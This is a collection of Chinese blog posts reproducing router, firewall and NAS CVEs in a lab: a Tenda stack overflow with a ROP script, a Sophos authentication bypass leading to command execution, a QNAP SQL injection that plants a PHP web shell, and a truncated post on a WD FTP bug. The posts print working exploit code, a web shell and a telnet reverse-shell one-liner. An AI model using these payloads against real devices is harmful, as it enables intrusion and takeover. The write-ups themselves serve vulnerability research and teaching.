[{"content":"CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞\n环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）\n这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）\n环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi\n随后使用binwalk提取固件\nbinwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin\r#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：\n通过检查一下busybox，目的是检查该固件需要的位数和架构：\narm架构，32位，小端。\n所以我们需要使用qemu-arm-static来拟真环境\nsudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./\n执行命令后，我们看到程序在 Welcome to ...处不动了。\n为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：\n通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。\n这里我们可以通过两个方法解决这个问题：\n给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：\nsudo apt install uml-utilities bridge-utils\rsudo brctl addbr br0\rsudo brctl addif br0 ens33\rsudo ifconfig br0 up\rsudo dhclient br0 通过 ifconfig可以查看到桥已经创建成功\n随后我们再次运行httpd就可以看到刚刚问题被解决了，但是又遇到了另外一个问题：\n其实这个报错的地点就在刚刚那个问题的下面：\n通过分析汇编，我们可以看到，解决掉刚刚的问题后，程序会跳转到下面进入一个叫做 ConnectCfm 的函数，然后检查返回值，如果检查通过则跳转，没通过就报错\n很明显我们这里没有检查通过，所以我们这里直接选择修改二进制文件：\n这里的逻辑大致为：\n函数结束，将返回值放入r0 将r0让如r3 比较r3是否为0 如果不是0则跳转，如果是则继续运行报错 所以我们这里直接选择将上面的 mov r3,r0 改为 mov r3,#1，这样就能保证r3不为0了。\n这里我选择的是ida的 patch功能+在线arm翻译。当然也有很多patch功能的ida插件，大家可以自行选用\n改完之后记得点 Apply patches to input file...\n然后覆盖之前的httpd二进制，就可以顺利的启动了：\n访问 http://192.168.52.128/goform/getProduct\n说明环境已经模拟成功了\n漏洞分析 首先我们找到网上的poc：\n#python3\rimport requests\rurl = \u0026#34;http://192.168.52.128/goform/xxx\u0026#34;\rcookie = {\u0026#34;Cookie\u0026#34;:\u0026#34;password=\u0026#34;+\u0026#34;A\u0026#34;*1000}\rrequests.get(url=url, cookies=cookie) 分析poc，我们可以知道漏洞大概出现在对cookie字段进行分析的代码中\n我们首先在gdb中调试一下这个poc：\n使用以下命令重新打开httpd：\nsudo ./qemu-arm-static -L . -g 1234 ./bin/httpd\r# 1234就是qemu监听的调试端口，只需将ida或者gdb等连接到该端口即可进行调试 然后在另一边使用gdb-multiarch打开httpd，链接1234端口\nsudo gdb-multiarch ./bin/httpd\rtarget remote :1234 就可以进行调试了\n这里我们首先让程序跑起来，然后发送poc\n查看gdb时，发现gdb已经 Segmentation fault了\n这时我们查看一下bt\n发现程序进入了strstr()，随后Segmentation fault\n根据poc和bt的信息，我们可以猜测溢出点是在strstr()函数读取cookie或者password=时，所以我们通过ida进行字符串查找符合条件的地点：\n首先我们查找cookie，虽然能找到cookie字符串，但是在字符串出现的上下文中，没有找到strstr()函数的调用。\n然后我们查找password=，然后查看交叉调用，发现一个符合条件的地址：\n通过伪代码，我们可以看到，这里是把这里是在寻找password=和之后的内容，然后把 =和 ;之中的内容读取到 v31中。\n溢出点就在这里，v31的大小只有0x1c0，所以我们读取1000个字符，会造成溢出。\n漏洞利用 因为存在/x00截断，所以构造rop时，不能使用三个字节的地址。除非二进制文件本身足够大，否则只能去libc里找地址，如果同时libc开启了pie，那这个漏洞基本就没了\n因为我们要控制返回地址从而控制程序流，而现在的问题就是/x00截断。因为/x00截断，所以我们必须去libc中寻找四个字节的ROP地址。但是libc中又开启了PIE，但路由所提供的服务不能泄露libc的地址，因为这个基地址我们只能到路由设备上进行查看：\n查看的方法有两种：\n1.cat /proc/[pid]/maps\n2.在gdb中查看puts函数的地址，再减去puts函数在libc中的偏移\n我选择的是方法二，因为方法一查出来的libc基地址不准确，个人猜测是qemu模拟环境的问题\n然后puts在libc中的偏移量为 0x35cd4\n故基地址为 0x3fe1bcd4-0x35cd4=0x3fde6000\n随后我们寻找ROP：\n通过这两个指令我们可以看到：\n首先把puts放入r3，把下一条指令地址放入pc，随后将栈顶（参数）放入r0，然后跳转到函数\n故最后的exp：\nimport struct\rimport requests\rstring = \u0026#34;shoukaku\u0026#34;\rputs = 0x3fe1bcd4\rlibc_base = puts-0x35cd4\rpop_r3_pc = struct.pack(\u0026#39;\u0026lt;I\u0026#39;,libc_base + 0x00018298)\rmov_r0_ps = struct.pack(\u0026#34;\u0026lt;I\u0026#34;,libc_base + 0x00040cb8)\rpaylorad = b\u0026#39;a\u0026#39;*444+b\u0026#39;.png\u0026#39;+pop_r3_pc+struct.pack(\u0026#39;\u0026lt;I\u0026#39;, puts)+mov_r0_ps+string.encode()\rhead = {\r\u0026#34;User-Agent\u0026#34;:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0\u0026#34;,\r\u0026#34;Accept\u0026#34;:\u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#34;,\r\u0026#34;Cookie\u0026#34;:b\u0026#34;password=\u0026#34;+paylorad\r}\rrequests.get(url=\u0026#39;http://192.168.52.128/goform/hello\u0026#39;, headers=head) ![image-20230103101303369](/CVE-2018-5767TENDA-AC15.assets\n最后成功的输出字符串\n","permalink":"http://jellyfish-pro.github.io/vuln/cve-2018-5767-tenda-ac15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/","summary":"CVE-2018-5767 TENDA-AC15路由器栈溢出漏洞复现 复现目的： 熟悉设备漏洞的环境模拟（qemu-user模式的利用） 了解基本的arm指令和函数调用方式，并且构建ROP利用链 漏洞基本信息： 该漏洞是18年出现的漏洞，由于没有对用户输入字符长度进行限制，导致包中的cookie字段过长时会产生栈溢出漏洞\n环境搭建 环境搭建前言 由于是arm架构的漏洞，所以我们需要利用qemu进行环境仿真。（如果有富哥们也可以直接买真机，顺便V我50）\n这里需要注意，ubuntu如果直接使用apt安装qemu，会因为qemu版本太低导致仿真环境出现问题，所以我选择的是自己编译高版本的qemu （也就是5.2.0，也没有多高）\n环境搭建正文 首先，我们下载TENDA-AC15的固件 ，固件的版本为：15.03.1.16_multi\n随后使用binwalk提取固件\nbinwalk -Me1 US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin\r#注意这里的‘1’是数字1 进入提取出来的文件夹后，我们可以看到一个文件名字类似于linux系统root目录的文件：\n通过检查一下busybox，目的是检查该固件需要的位数和架构：\narm架构，32位，小端。\n所以我们需要使用qemu-arm-static来拟真环境\nsudo ./qemu-arm-static -L . ./bin/httpd 这里的 -L .是qemu-arm-static自带的一个chroot指令，可以理解为 chroot ./\n执行命令后，我们看到程序在 Welcome to ...处不动了。\n为了搞清具体什么问题，我们可以在ida中搜索字符串，找到这个位置：\n通过汇编，我们可以看到大概的流程，显示输出 WeLoveLinux， 随后检查我们的网络环境，如果没有检查通过，则会在这段代码中一直循环。\n这里我们可以通过两个方法解决这个问题：\n给qemu设置一个虚拟网络 修改二进制文件直接跳过这个检查 这里我选择给ubuntu设置一个桥，然后桥接到qemu：\nsudo apt install uml-utilities bridge-utils\rsudo brctl addbr br0\rsudo brctl addif br0 ens33\rsudo ifconfig br0 up\rsudo dhclient br0 通过 ifconfig可以查看到桥已经创建成功\n随后我们再次运行httpd就可以看到刚刚问题被解决了，但是又遇到了另外一个问题：","title":""},{"content":"漏洞简介 该漏洞是存在于Sophos Firewall，版本小于等于18.5.3的身份验证绕过漏洞。\n该漏洞是因为sophos Firewall框架中java和prel对json数据的处理方式出现了偏差，产生的漏洞。\n环境复现 sophos Firewall提供的不是物理设备，而是提供的虚拟机。直接去官网下载即可，需要注意的是，官网只能下载新版本，但是可以修改url中的版本号，下载有漏洞的版本。\n随后使用VMware打开.ova文件就可以直接搭建好sophos环境。\n不过这里需要注意一点就是网卡的配置：\nsophos有三张网卡，我们需要将三张网卡对应上不同的VMware虚拟网卡：\n像上图一样，网卡1使用桥接连接虚拟网卡1（VMnet1），另外两张使用net模式连接虚拟网卡8（VMnet8）。\n这里还有一点需要注意，虚拟网卡8我们可以不用特别设置，但是虚拟网卡1我们需要将子网ip改为172.16.16.0\n接着打开虚拟机，断网后登录 https://172.16.16.16:4444看到sophos配置界面则表示虚拟机配置成功。\n第一次访问sophos，sophos会让我们进行一些常规设置，这时如果不断网，sophos则会自动更新，断网后则进入离线模式。\n配置成功后，再次访问 https://172.16.16.16:4444，就可以看到登陆界面了：\njson数据处理差异分析 这里我们不会分析具体的代码，这里只是介绍sophos Firewall的框架，并且介绍该架构为什么会产生这个漏洞。\nsophos框架分析 因为这个漏洞和sophos的框架相关，所以我们先介绍sophos的架构：\n通过这个图我们可以看到，sophos Firewall前面使用了 Apache和jetty来进行信息的接受和分发，而后面则使用 csc和perl来执行具体的命令。\nApache和jetty这里就不多做介绍。这里需要注意的是：这里的perl并不完全等于我们在linux中使用的perl命令。\nsophos中的perl是指向csc的：\n而对于csc的反编译，我们可以发现在csc中有许多和json数据相关的动态链接库函数： 对这些函数进行搜索时，我们就可以发现，这些函数来自于一个名叫 json-c的库。\n这也就说明，csc调用这个 json-c库对json数据进行解析，然后再传给perl。\n漏洞逻辑分析 那么，这个框架为什么会产生漏洞呢，原因就在于，框架接受分发json数据时使用的是java，而后面处理json时却使用的是 json-cC语言库。而这两种语言对于json数据的处理存在差异，正是这个差异导致了漏洞的出现。\n我们可以使用一个简单例子：\n对于处理同样的数据：\n{ \u0026quot;name\\u0000ef\u0026quot;: \u0026quot;test\u0026quot;, \u0026quot;name\u0026quot;:\u0026quot;test2\u0026quot; }\n对于java来说：\nimport org.json.JSONObject;\rimport org.json.JSONException;\rimport java.io.*;\rclass test {\rpublic static void main(String[] args) {\rtry{\rSystem.out.println(new JSONObject(\u0026#34;{ \\\u0026#34;name\\\u0026#34;: \\\u0026#34;test\\\u0026#34;, \\\u0026#34;name\\\\u0000ef\\\u0026#34;: \\\u0026#34;test2\\\u0026#34;}\u0026#34;));\r}catch (JSONException e){\rSystem.out.println(e);\r}\r}\r} 其输出结果是：\n而对于json-c来说：\n#include \u0026lt;iostream\u0026gt;\r#include \u0026lt;json-c/json.h\u0026gt;\rint main() {\rauto jsonObj = json_tokener_parse(R\u0026#34;({ \u0026#34;name\\u0000ef\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;test2\u0026#34; })\u0026#34;);\rstd::cout \u0026lt;\u0026lt; json_object_to_json_string(jsonObj) \u0026lt;\u0026lt; std::endl;\rreturn 0;\r} 从两个结果，我们就可以看出差别：\n对于java而言， name\\u0000ef和 name是两个不同的key。\n但是对于json-c而言，name\\u0000ef和 name是相同的key，从而第二个值覆盖了第一个值。\njson数据流和认证绕过 上面我们从理论上介绍了这个漏洞原理，这里我们要看一 看sophos的代码究竟是如何让触发这个漏洞成为可能的。\n分析数据流 我们从sophos的登录包下手：\n我们可以看到这里访问的是 /webconsole/Controller,但是我们并没有在sophos在找到这个名叫 Controller的文件。所以我们怀疑这是一个 servlet。\n所以来到 /webconsole目录下，我们看到一个 web.xml，通过阅读，我们找到了 Controller要转发的类：\n找到这个类后，我们发现，这个类是处理 mode参数。\n#CyberoamCommonServlet.class\rpublic class CyberoamCommonServlet extends HttpServlet {\r//......\rprivate void _doPost(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse, int paramInt, SqlReader paramSqlReader) throws IOException, JSONException {\r//......\relse if (eventBean.getRequesttype() == 2) {\rString str = CSCClient.getTransactionID();\rtransactionBean.setTransactionID(str);\rCyberoamCustomHelper.process(httpServletRequest, paramHttpServletResponse, eventBean, transactionBean, paramSqlReader);\r}\r//......\r}\r}\r这里将mode参数传入 CyberoamCustomHelper.process方法中：\n#CyberoamCustomHelper.class\rpublic class CyberoamCustomHelper {\r//......\rpublic static void process(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse, EventBean paramEventBean, TransactionBean paramTransactionBean, SqlReader paramSqlReader) {\r//......\rif (151 == paramEventBean.getMode()) {\rCSCClient cSCClient = new CSCClient();\rint k = cSCClient.generateAndSendAjaxEvent(paramHttpServletRequest, paramHttpServletResponse, paramEventBean,paramSqlReader);\rif (k == 200 || k == 201) {\r//...... 通过这段代码，我们就可以看到，这里调用了一个 cSCClient类中的 generateAndSendAjaxEvent，然后将用户密码都传入进去。\n最后返回了一个状态码，如果状态码为200，则表示登录成功。\n认证绕过 数据流分析到这里就很明显了，因为这里返回值为200，java就会认为登录成功。而登录具体的流程则由后面的csc进行处理。\n结合上面我们提到的漏洞产生的原因，故我们使用的poc为：\nmode=151\u0026amp;json=%7B%22mode%5Cu0000ef%22%3A259%2C%22username%22%3A%22admin%22%2C%22password%22%3A%22123456%22%2C%22languageid%22%3A%224%22%2C%22browser%22%3A%22Chrome_106%22%7D\u0026amp;__RequestType=ajax 解码后为：\nmode=151\u0026amp;json={\u0026#34;mode\\u0000ef\u0026#34;:259,\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123456\u0026#34;,\u0026#34;languageid\u0026#34;:\u0026#34;4\u0026#34;,\u0026#34;browser\u0026#34;:\u0026#34;Chrome_106\u0026#34;}\u0026amp;__RequestType=ajax 通过这个poc，我们可以看到，这里有两个mode参数。第一个mode参数让java进入登录模块，第二个mode参数是在csc中让json-c覆盖掉之前的mode参数，从而让perl执行别的模块命令，从而返回200状态码。最后200状态码返回到java，java判断登录成功，漏洞利用成功。\n漏洞复现 我们利用burp抓取正常的登陆包：\n现在我们重新抓一个登录包，将data改为poc：\n可以看到已经登录成功了。\nexp 因为需要登录，所以直接模拟发包：\n首先获取cookie：\nurl = \u0026#34;https://172.16.16.16/userportal/webpages/myaccount/login.jsp\u0026#34;\rret = requests.get(url=url, verify=False)\rcookie = ret.headers[\u0026#39;Set-Cookie\u0026#39;]\rprint(cookie) 然后使用这个cookie进行登录绕过：\nurl = \u0026#34;https://172.16.16.16/userportal/Controller\u0026#34;\rdata = \u0026#34;mode=451\u0026amp;json=%7B%22mode%5Cu0000ef%22%3A259%2C%22username%22%3A%22admin%22%2C%22password%22%3A%22123456%22%2C%22languageid%22%3A%224%22%2C%22browser%22%3A%22Chrome_106%22%7D\u0026amp;__RequestType=ajax\u0026#34;\rheader = {\r\u0026#34;Cookie\u0026#34;:cookie\r}\rret = urllib.request.Request(url, data=data.encode(), headers=header)\rwith urllib.request.urlopen(ret, context=context) as req:\rhtml = req.read()\rstatus = req.status\rprint(status)\rprint(html) 随后我们需要访问 index.jsp，获取token\nurl = \u0026#34;https://172.16.16.16/userportal/webpages/myaccount/index.jsp\u0026#34;\rreq = urllib.request.Request(url)\rreq.add_header(\u0026#34;Cookie\u0026#34;,cookie)\rwith urllib.request.urlopen(req, context=context) as response:\rhtml = response.read()\rif b\u0026#39;t0k3n\u0026#39; in html:\rpos = html.find(b\u0026#39;t0k3n\u0026#39;)\rtoken = html[pos+9:pos+9+26].decode()\rprint(\u0026#34;token: {}\u0026#34;.format(token))\relse:\rprint(\u0026#34;Get Token Falid\u0026#34;)\rexit(0) 随后使用这个token进行命令执行：\ncmd = sys.argv[1].replace(\u0026#34; \u0026#34;, \u0026#34;+\u0026#34;)\rurl = \u0026#34;https://172.16.16.16/userportal/Controller\u0026#34;\rurl += \u0026#39;?mode=1415\u0026amp;json={\u0026#34;pagesize\u0026#34;:\u0026#34;123`\u0026#39;+cmd+\u0026#39;`\u0026#34;,\u0026#34;vouchersperpage\u0026#34;:123,\u0026#34;addqrcode\u0026#34;:123,\u0026#34;name\u0026#34;:[\u0026#34;1\u0026#34;,\u0026#34;2\u0026#34;],\u0026#34;portal\u0026#34;:123}\u0026amp;__RequestType=ajax\u0026#39;\r# ex(url)\rreq = urllib.request.Request(url)\rreq.add_header(\u0026#39;Cookie\u0026#39;,cookie)\rreq.add_header(\u0026#34;X-CSRF-Token\u0026#34;,token)\rreq.add_header(\u0026#34;Referer\u0026#34;,\u0026#34;https://172.16.16.16/userportal/webpages/myaccount/index.jsp\u0026#34;)\rwith urllib.request.urlopen(req, context=context) as response:\rres = response.status\rheaders = response.getheaders()\rhtml = response.read()\rprint(res)\rprint(headers)\rprint(html) ","permalink":"http://jellyfish-pro.github.io/vuln/cve-2022-1040-sophos%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/","summary":"漏洞简介 该漏洞是存在于Sophos Firewall，版本小于等于18.5.3的身份验证绕过漏洞。\n该漏洞是因为sophos Firewall框架中java和prel对json数据的处理方式出现了偏差，产生的漏洞。\n环境复现 sophos Firewall提供的不是物理设备，而是提供的虚拟机。直接去官网下载即可，需要注意的是，官网只能下载新版本，但是可以修改url中的版本号，下载有漏洞的版本。\n随后使用VMware打开.ova文件就可以直接搭建好sophos环境。\n不过这里需要注意一点就是网卡的配置：\nsophos有三张网卡，我们需要将三张网卡对应上不同的VMware虚拟网卡：\n像上图一样，网卡1使用桥接连接虚拟网卡1（VMnet1），另外两张使用net模式连接虚拟网卡8（VMnet8）。\n这里还有一点需要注意，虚拟网卡8我们可以不用特别设置，但是虚拟网卡1我们需要将子网ip改为172.16.16.0\n接着打开虚拟机，断网后登录 https://172.16.16.16:4444看到sophos配置界面则表示虚拟机配置成功。\n第一次访问sophos，sophos会让我们进行一些常规设置，这时如果不断网，sophos则会自动更新，断网后则进入离线模式。\n配置成功后，再次访问 https://172.16.16.16:4444，就可以看到登陆界面了：\njson数据处理差异分析 这里我们不会分析具体的代码，这里只是介绍sophos Firewall的框架，并且介绍该架构为什么会产生这个漏洞。\nsophos框架分析 因为这个漏洞和sophos的框架相关，所以我们先介绍sophos的架构：\n通过这个图我们可以看到，sophos Firewall前面使用了 Apache和jetty来进行信息的接受和分发，而后面则使用 csc和perl来执行具体的命令。\nApache和jetty这里就不多做介绍。这里需要注意的是：这里的perl并不完全等于我们在linux中使用的perl命令。\nsophos中的perl是指向csc的：\n而对于csc的反编译，我们可以发现在csc中有许多和json数据相关的动态链接库函数： 对这些函数进行搜索时，我们就可以发现，这些函数来自于一个名叫 json-c的库。\n这也就说明，csc调用这个 json-c库对json数据进行解析，然后再传给perl。\n漏洞逻辑分析 那么，这个框架为什么会产生漏洞呢，原因就在于，框架接受分发json数据时使用的是java，而后面处理json时却使用的是 json-cC语言库。而这两种语言对于json数据的处理存在差异，正是这个差异导致了漏洞的出现。\n我们可以使用一个简单例子：\n对于处理同样的数据：\n{ \u0026quot;name\\u0000ef\u0026quot;: \u0026quot;test\u0026quot;, \u0026quot;name\u0026quot;:\u0026quot;test2\u0026quot; }\n对于java来说：\nimport org.json.JSONObject;\rimport org.json.JSONException;\rimport java.io.*;\rclass test {\rpublic static void main(String[] args) {\rtry{\rSystem.out.println(new JSONObject(\u0026#34;{ \\\u0026#34;name\\\u0026#34;: \\\u0026#34;test\\\u0026#34;, \\\u0026#34;name\\\\u0000ef\\\u0026#34;: \\\u0026#34;test2\\\u0026#34;}\u0026#34;));\r}catch (JSONException e){\rSystem.","title":""},{"content":"CVE-2022-27596 威联通5.0.1sql注入漏洞 漏洞简介 该漏洞是威联通(qnap)旗下的NAS设备的固件上的数据库注入漏洞。\n固件版本为：\n该漏洞出现在QTS和QTS_hero的5.0.1版本的固件上且只出现在这一个版本的固件上，应该是一个新添加的功能发现了漏洞，然后被修复了。\n环境搭建 这里是直接使用的设备(qnap TS-853 pro)\n该设备可以直接通过ssh和telnet连接上shell：\n连上shell后会出现选择菜单，但退出菜单后，就可以选择是否进入linux的shell\n漏洞分析 对于qnap的漏洞，在网上基本除了CVE号，很少有其他的信息。其原因大家懂的都懂。\n针对这种漏洞，我们需要通过比较补丁的方式来定位漏洞点，至于如何定位到该漏洞请看这篇文章：\n[CVE-2022-27596 | CataLpa\u0026rsquo;s Home (wzt.ac.cn)]\n该文章虽然写了怎么调试漏洞，但是我在调试时，每次程序都不能断在关键的位置，故下面采用其他的方法进行调试。\n静态分析 该漏洞存在authLogin.cgi的库文件中libuLinux_NAS.so.0.0的sub_7FFFF76BB4CB函数中\n该函数删除了符号，但可以通过搜索字符串找到。\nv9 = s\r···\rif ( *(_QWORD *)(a8 + 24) )\r{\rv13 = *(const char **)(a8 + 24);\rv14 = strlen(s);\ra2 = \u0026#34;AND token = \u0026#39;%s\u0026#39; \u0026#34;;\rsprintf(\u0026amp;s[v14], \u0026#34;AND token = \u0026#39;%s\u0026#39; \u0026#34;, v13);\r}\r···\rv49 = sqlite3_mprintf(\u0026amp;byte_7FFFF76DFA7F, a2, v9);\r···\rv48 = sqlite3_mprintf(\u0026#34;SELECT * FROM QTOKEN %s %s %s;\u0026#34;, v49, v51, v50);\r···\rsqlite3_free(v48) 漏洞点则在sprintf()函数，该函数使用的%s，会直接将v13参数上的字符拼接到\u0026quot;AND token = '%s' \u0026quot;上，最后拼接到sql语句上。但是v13是可以被我们控制的，也就意味着sql语句可以被我们控制\n动态分析 我们知道了该漏洞在authLogin.cgi的库文件中libuLinux_NAS.so.0.0中。\n上面的文章采用的是写一个脚本进行循环附加，但无法保证断点的位置。我是一次都没有断在关键的地方\n所以我们选择直接调试authLogin.cgi，虽然可以直接调试cgi程序，但是如果想要程序进入漏洞点，还需要传给authLogin.cgi需要的数据，这种数据常见的是环境变量。\n首先，关掉地址随机化\n至于需要什么数据，这就得去ida里找了。\n这里我会将直接给出调试命令和TB，这样就可以通过ida来学习怎么找环境变量，但实际情况下如果要找到需要的数据还是要一点一点啃源码或者反汇编：\nQUERY_STRING=\u0026#34;app=MUSIC_STATION\u0026amp;app_token=123\u0026amp;sid=1\u0026amp;client_app=1\u0026amp;client_agent=\u0026lt;\u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34;\u0026gt;\u0026#34; ./gdbserver :1234 authLogin.cgi 在qnap上执行命令，使用gdb连上去，和常规的gdb远程调试一样，然后将断点打在漏洞处，随后c过去。\n然后往下，就可以看到程序拼接的sql语句：\n继续往下就是最终的sql语句：\n漏洞复现 因为我们可以进行sql注入，那么我们就可以使用sql语句创建一个php文件，写入一句话马：\nPOST /cgi-bin/authLogin.cgi HTTP/1.1\rHost: 192.168.0.177:5000\rContent-Length: 158\rConnection: close\rapp=MUSIC_STATION\u0026amp;app_token=123\u0026#39;;ATTACH DATABASE \u0026#39;/share/CACHEDEV1_DATA/.qpkg/musicstation/123.php\u0026#39; AS qnapkey;CREATE TABLE qnapkey.key (dataz text);INSERT INTO qnapkey.key (dataz) VALUES (\u0026#34;\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34;);--\r\u0026amp;sid=1\u0026amp;client_app=1\u0026amp;client_agent=\u0026lt;\u0026#34;a\u0026#34; * 0x3000\u0026gt; 这里需要熟悉sql语句，并且qnap使用的是sqlite数据库。可惜我并不熟悉sql语句，故只能使用上面提到的这位大佬的poc 。我太菜了\n发送这个包后，我们就可以在设备里搜索到这个php文件了\n随后我们访问这个php：\n可以看到命令已经执行了。\n注意事项 需要注意的是，在qnap的本身的服务中，绝大数都是使用的cgi来实现的，因此将一句话木马放在网站的文件系统下，是不能被php解析的。\n这时，我们就需要将一句话木马放入app的目录中，例如MUSIC_STATION、PHOTO_STATION的目录下，而存放app的目录则是/share/CACHEDEV1_DATA/.qpkg/：\n放到这些文件夹下后，找到对应的路径访问就行了：\n随后使用exp，打开nc，使用以下命令反弹shell：\nrm /tmp/f;mknod /tmp/f p;telnet 192.168.50.30 8080 \u0026lt; /tmp/f |/bin/bash \u0026gt;/tmp/f 2\u0026gt;/tmp/f Don\u0026rsquo;t ask me where is the exp\n","permalink":"http://jellyfish-pro.github.io/vuln/cve-2022-27596-%E5%A8%81%E8%81%94%E9%80%9A5.0.1sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","summary":"CVE-2022-27596 威联通5.0.1sql注入漏洞 漏洞简介 该漏洞是威联通(qnap)旗下的NAS设备的固件上的数据库注入漏洞。\n固件版本为：\n该漏洞出现在QTS和QTS_hero的5.0.1版本的固件上且只出现在这一个版本的固件上，应该是一个新添加的功能发现了漏洞，然后被修复了。\n环境搭建 这里是直接使用的设备(qnap TS-853 pro)\n该设备可以直接通过ssh和telnet连接上shell：\n连上shell后会出现选择菜单，但退出菜单后，就可以选择是否进入linux的shell\n漏洞分析 对于qnap的漏洞，在网上基本除了CVE号，很少有其他的信息。其原因大家懂的都懂。\n针对这种漏洞，我们需要通过比较补丁的方式来定位漏洞点，至于如何定位到该漏洞请看这篇文章：\n[CVE-2022-27596 | CataLpa\u0026rsquo;s Home (wzt.ac.cn)]\n该文章虽然写了怎么调试漏洞，但是我在调试时，每次程序都不能断在关键的位置，故下面采用其他的方法进行调试。\n静态分析 该漏洞存在authLogin.cgi的库文件中libuLinux_NAS.so.0.0的sub_7FFFF76BB4CB函数中\n该函数删除了符号，但可以通过搜索字符串找到。\nv9 = s\r···\rif ( *(_QWORD *)(a8 + 24) )\r{\rv13 = *(const char **)(a8 + 24);\rv14 = strlen(s);\ra2 = \u0026#34;AND token = \u0026#39;%s\u0026#39; \u0026#34;;\rsprintf(\u0026amp;s[v14], \u0026#34;AND token = \u0026#39;%s\u0026#39; \u0026#34;, v13);\r}\r···\rv49 = sqlite3_mprintf(\u0026amp;byte_7FFFF76DFA7F, a2, v9);\r···\rv48 = sqlite3_mprintf(\u0026#34;SELECT * FROM QTOKEN %s %s %s;\u0026#34;, v49, v51, v50);\r···\rsqlite3_free(v48) 漏洞点则在sprintf()函数，该函数使用的%s，会直接将v13参数上的字符拼接到\u0026quot;AND token = '%s' \u0026quot;上，最后拼接到sql语句上。但是v13是可以被我们控制的，也就意味着sql语句可以被我们控制","title":""},{"content":"CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞 漏洞简介 该漏洞是存在于西数nas上的一个ftp权限绕过漏洞。其广泛存在于西数的多款nas设备中。但在设备中，ftp服务并不是默认开启的。故该漏洞的利用存在一定的限制。\n环境搭建 该漏洞是Luca Moro (@johncool__) 在Pwn2Own比赛中曝光的。故我们可以直接拿比赛中使用的固件。\n因为漏洞存在于ftp服务中，而西数nas设备的ftp服务来自于开源项目：Pure-FTPd。\n当然西数在其基础上进行了，首先下载西数所有的GPL，解压后进入WDMyCloud_PR4100_GPL_v5.24.108_20220826/open-source-packages/pure-ftpd/pure-ftpd-1.0.47/目录\n执行下面的命令将pure-ftpd修改为西数的版本：\ntar xf pure-ftpd_1.0.47.orig.tar.gz\rcd pure-ftpd-1.0.47.orig\rfor patch_name in `ls ../patch`; do echo \u0026#34;--\u0026gt;patch name=$patch_name\u0026#34; ; patch -p1 -i ../patch/${patch_name} ; done 设备启动流程 接下来我们将固件进行解压，该固件直接用binwalk解压就行。\n解压下来后我们可以观察到，固件中有一个cpio-root和squashfs-root文件夹。\n根据以往的经验，cpio-root文件夹是BootLoader启动内核阶段的临时文件系统。而squashfs-root是设备真正的文件系统。\n但在西数nas设备中却不太一样，进入squashfs-root文件夹中，我们可以发现这里面的bin文件夹下没有文件：\n这就意味着直接使用这个文件夹作为根目录的话，是不能执行命令的。并且在etc文件夹下没有和系统启动相关的文件。\nbin文件夹下没有东西，那么整个系统是怎么运行的呢？我们就要来到系统运行的上一步：BootLoader加载内核。\n刚刚说到，cpio-root文件夹中有一个文件系统，来到这个文件夹下的etc目录，我们就可以看到：\n这里就出现了一个inittab的系统初始化文件，在这个文件中就指明了系统启动需要去找的文件：/etc/rc.sh 注意这里不是指本机的etc目录\n而在/etc/rc.sh 中有一段代码，会将squashfs文件夹挂载到当前文件系统的*/usr/local/modules*目录下：\n可以看到这段代码已经被注释掉，原因是开发者将这段代码集成到了上面的chk_image二进制文件中。\n将squashfs文件夹挂载过来后，/etc/rc.sh 会在最后运行一个脚本：system_init\n**注意：**这里的路径是已经被挂载后的路径。\n这个system_init的主要内容就是将squashfs文件夹中的文件复制到当前文件系统对应的文件中，并且启动各种服务。\n启动ftp服务 上面将系统启动的流程理清了，理清了之后我们就可以尝试启动环境。但是可惜的是，虽然该设备的架构是x86-64，但是任然不能启动，原因可能是设备自检没有过。\n虽然环境不能启动，但是我们可以直接启动ftp服务呀。\n我们可以直接启动ftp服务：\n漏洞分析 静态分析 因为这是一个权限绕过漏洞，而该ftp文件中就有两个专门处理登录的函数：douser和dopass，而漏洞点则出现在douser函数中： 